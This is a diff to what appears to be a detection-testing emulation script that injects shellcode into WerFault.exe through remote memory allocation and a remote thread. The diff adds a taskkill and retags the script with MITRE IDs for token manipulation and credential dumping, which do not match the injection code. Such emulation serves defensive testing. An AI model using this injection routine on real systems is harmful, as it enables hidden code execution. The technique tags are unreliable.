@@ -6,7 +6,7 @@
 from . import common
 from . import RtaMetadata
 from ctypes import *
-import ctypes
+import ctypes, time
 import ctypes.wintypes
 
 from ctypes.wintypes import BOOL
@@ -40,7 +40,7 @@ metadata = RtaMetadata(
          'rule_name': 'Potential Masquerading as Windows Error Manager'},
     ],
     siem=[],
-    techniques=["T1055", "T1036"],
+    techniques=["T1134", "T1003"],
 )
 
 
@@ -68,12 +68,11 @@ def Inject(path, shellcode):
 
     # allocate RWX memory
     lpBuffer = VirtualAllocEx(process_handle, 0, shellcode_length, memcommit, page_rwx_value)
-    print('[+] - Allocated remote memory at', hex(lpBuffer))
+    print('[+] - Allocated remote memory at ', hex(lpBuffer))
 
     # write shellcode in allocated memory
-    res = WriteProcessMemory(process_handle, lpBuffer, shellcode, shellcode_length, 0)
-    if res > 0 :
-        print('[+] - Shellcode written')
+    WriteProcessMemory(process_handle, lpBuffer, shellcode, shellcode_length, 0)
+
     # create remote thread to start shellcode execution
     CreateRemoteThread(process_handle, None, 0, lpBuffer, 0, 0, 0)
     print('[+] - Shellcode Injection, done.')
@@ -85,6 +84,8 @@ def main():
 
     # Inject shellcode into notepad.exe
     Inject(u"C:\\Windows\\SysWOw64\\WerFault.exe", shellcode)
+    time.sleep(2)
+    common.execute(["taskkill", "/f", "/im", "WerFault.exe"])
 
 
 if __name__ == "__main__":
